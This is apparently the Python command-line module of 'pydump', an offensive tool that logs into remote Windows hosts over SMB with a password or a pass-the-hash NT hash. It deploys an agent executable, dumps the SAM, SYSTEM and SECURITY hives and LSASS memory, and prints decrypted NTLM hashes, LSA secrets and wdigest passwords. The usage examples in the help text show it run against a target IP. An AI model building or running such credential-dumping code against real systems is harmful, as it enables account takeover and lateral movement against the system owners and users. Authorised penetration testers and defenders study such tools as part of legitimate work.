"""Command-line interface for pydump."""

import argparse
import sys
import os

__version__ = "0.2.0"


def main():
    parser = argparse.ArgumentParser(
        prog="pydump",
        description="Remote Windows credential extraction tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  pydump dump -t 192.168.1.50 -u admin -p 'P@ssw0rd'
  pydump dump -t 192.168.1.50 -u admin -H aad3b4...ef40 -m registry
  pydump dump -t 192.168.1.50 -u admin -p pass -o lsass.dmp
  pydump parse -f lsass.dmp
""",
    )
    parser.add_argument("-V", "--version", action="version", version=f"%(prog)s {__version__}")

    subparsers = parser.add_subparsers(dest="command")

    # ─── dump ───────────────────────────────────────────────────────────────
    dump_parser = subparsers.add_parser("dump", help="Extract credentials from a remote target")
    dump_parser.add_argument("-t", "--target", required=True, help="Target IP or hostname")
    dump_parser.add_argument("-u", "--username", required=True, help="Username")
    dump_parser.add_argument("-p", "--password", default="", help="Password")
    dump_parser.add_argument("-H", "--hash", default=None, dest="nt_hash",
                             metavar="NTHASH", help="NT hash for pass-the-hash (32 hex chars)")
    dump_parser.add_argument("-d", "--domain", default=".", help="Domain (default: local)")
    dump_parser.add_argument(
        "-m", "--method",
        choices=["auto", "registry"],
        default="auto",
        help="Extraction scope (default: auto = registry + LSASS)",
    )
    dump_parser.add_argument("--pid", type=int, default=None, help="LSASS PID (auto-detected if omitted)")
    dump_parser.add_argument("--agent", default=None, metavar="PATH", help="Path to agent.exe")
    dump_parser.add_argument("-o", "--output", default=None, metavar="FILE", help="Save raw LSASS dump to file")

    # ─── parse ──────────────────────────────────────────────────────────────
    parse_parser = subparsers.add_parser("parse", help="Parse an existing LSASS minidump file")
    parse_parser.add_argument("-f", "--file", required=True, metavar="PATH", help="Path to .dmp file")

    args = parser.parse_args()

    if not args.command:
        parser.print_help()
        sys.exit(0)

    # Validate auth
    if args.command == "dump":
        if not args.password and not args.nt_hash:
            print("[!] Error: provide either -p/--password or -H/--hash")
            sys.exit(1)
        if args.nt_hash:
            h = args.nt_hash.lower()
            if len(h) != 32 or not all(c in "0123456789abcdef" for c in h):
                print("[!] Error: --hash must be exactly 32 hex characters")
                sys.exit(1)
            args.nt_hash = h

    if args.command == "dump":
        _cmd_dump(args)
    elif args.command == "parse":
        _cmd_parse(args)


def _cmd_dump(args):
    """Deploy agent, extract registry hives + LSASS."""
    from .smb import SmbSession
    from .dump.methods import PipeDump

    agent_path = args.agent or os.path.join(os.path.dirname(os.path.dirname(__file__)), "agent", "bin", "agent.exe")
    if not os.path.isfile(agent_path):
        print(f"[!] Agent not found: {agent_path}")
        print("    Build it with: cd agent && make cross")
        sys.exit(1)

    print(f"[*] Connecting to {args.target}...")

    try:
        with SmbSession(args.target, args.username, args.password, args.domain,
                        nt_hash=args.nt_hash) as session:
            auth_method = "PTH" if args.nt_hash else "password"
            print(f"[+] Authenticated as {args.domain}\\{args.username} ({auth_method})")

            method = PipeDump(session, agent_path)

            # Determine LSASS PID (0 = registry only)
            do_lsass = args.method == "auto"
            lsass_pid = 0
            if do_lsass:
                lsass_pid = args.pid or method.find_lsass_pid()
                print(f"[*] Deploying agent (registry + LSASS pid={lsass_pid})")
            else:
                print("[*] Deploying agent (registry only)")

            result = method.execute(lsass_pid=lsass_pid)

            # Process registry hives
            if result.system_hive and result.sam_hive:
                _process_hives(result.system_hive, result.sam_hive, result.security_hive)

            # Process LSASS dump
            if result.lsass_dump:
                print(f"\n[+] LSASS dump: {len(result.lsass_dump)} bytes ({len(result.lsass_dump) // 1024 // 1024} MB)")
                if args.output:
                    with open(args.output, "wb") as f:
                        f.write(result.lsass_dump)
                    print(f"[+] Saved to {args.output}")
                _parse_and_display(result.lsass_dump)
            elif do_lsass:
                print("\n[-] No LSASS data received")

    except Exception as e:
        print(f"[!] Failed: {e}")
        sys.exit(1)


def _process_hives(system_hive: bytes, sam_hive: bytes, security_hive: bytes):
    """Parse and decrypt registry hives received from the agent."""
    import struct
    from .secrets.hivereader import RegistryHive
    from .secrets.crypto import (
        extract_boot_key, compute_hashed_boot_key, decrypt_sam_hash_aes,
        decrypt_lsa_key, decrypt_lsa_secret,
    )
    from .secrets.registry import RegistrySecrets

    print()
    print("── Registry Secrets ─────────────────────────────────────────")

    try:
        sys_hive = RegistryHive(system_hive)
        boot_key = RegistrySecrets._boot_key_from_hive_static(sys_hive)
    except Exception as e:
        print(f"[!] Failed to parse SYSTEM hive: {e}")
        return

    # SAM hashes
    if sam_hive:
        try:
            reg = RegistrySecrets.__new__(RegistrySecrets)
            hashes = reg._parse_sam_hive(sam_hive, boot_key)
            if hashes:
                print(f"[+] SAM hashes ({len(hashes)}):")
                for h in hashes:
                    print(f"    {h.username}:{h.rid}:{h.lm_hash or 'aad3b435b51404ee'}:{h.ntlm_hash}:::")
            else:
                print("[-] No SAM hashes found")
        except Exception as e:
            print(f"[!] SAM extraction failed: {e}")

    # LSA Secrets
    if security_hive:
        try:
            reg = RegistrySecrets.__new__(RegistrySecrets)
            secrets = reg._parse_security_hive(security_hive, boot_key)
            if secrets:
                print(f"[+] LSA Secrets ({len(secrets)}):")
                for s in secrets:
                    print(f"    {s.name}: {s.decoded}")
            else:
                print("[-] No LSA secrets found")
        except Exception as e:
            print(f"[!] LSA secrets failed: {e}")


def _cmd_parse(args):
    """Parse a local dump file."""
    from .parser.minidump import parse

    if not os.path.isfile(args.file):
        print(f"[!] File not found: {args.file}")
        sys.exit(1)

    with open(args.file, "rb") as f:
        dump_data = f.read()

    print(f"[*] Parsing {args.file} ({len(dump_data)} bytes)")
    _parse_and_display(dump_data)


def _parse_and_display(dump_data: bytes):
    """Parse dump and display extracted credentials."""
    from .parser.minidump import parse
    from .parser.extract import CredentialExtractor

    print("[*] Parsing minidump...")
    dump = parse(dump_data)

    print(f"    OS: {dump.sysinfo_major}.{dump.sysinfo_minor} build {dump.sysinfo_build}")
    print(f"    Modules: {len(dump.modules)}")
    print(f"    Memory segments: {len(dump.memory)}")
    print()

    print("[*] Extracting credentials...")
    extractor = CredentialExtractor(dump)

    try:
        credentials = extractor.extract()
    except Exception as e:
        print(f"[!] {e}")
        return

    if not credentials:
        print("[-] No credentials found")
        return

    print(f"[+] Found {len(credentials)} credential(s):\n")
    print(f"{'Auth':<10} {'Domain':<20} {'Username':<25} {'Secret'}")
    print("-" * 90)

    for cred in credentials:
        if cred.auth_type == "msv1_0":
            secret = cred.ntlm_hash if cred.ntlm_hash else "(empty)"
        elif cred.auth_type == "wdigest":
            secret = cred.password if cred.password else "(empty)"
        else:
            secret = "(see above)"

        print(f"{cred.auth_type:<10} {cred.domain:<20} {cred.username:<25} {secret}")


